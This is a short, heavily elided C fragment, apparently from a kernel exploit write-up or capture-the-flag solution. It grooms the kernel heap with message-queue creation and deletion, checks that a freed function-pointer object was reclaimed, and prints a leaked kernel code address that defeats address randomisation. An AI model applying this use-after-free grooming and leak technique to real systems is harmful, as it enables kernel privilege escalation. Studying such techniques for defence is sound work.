...
{   
    ...
    del(0);
    int msgid   = msgQueueCreate("/home/user/1");
    int msgid2  = msgQueueCreate("/home/user/2");
    ...
    msgQueueDel(msgid);
    msgid   = msgQueueCreate("/home/user/1");
    ...
    printf("[+][LEAK] Kernel Exec: %p\n",*verify);
    if( (0xfff & (size_t)(*verify)) != 0xfd0)
        panic("[-] Failed to free an FOP");
    ...
    // Refil
    msgid   = msgQueueCreate("/home/user/4");
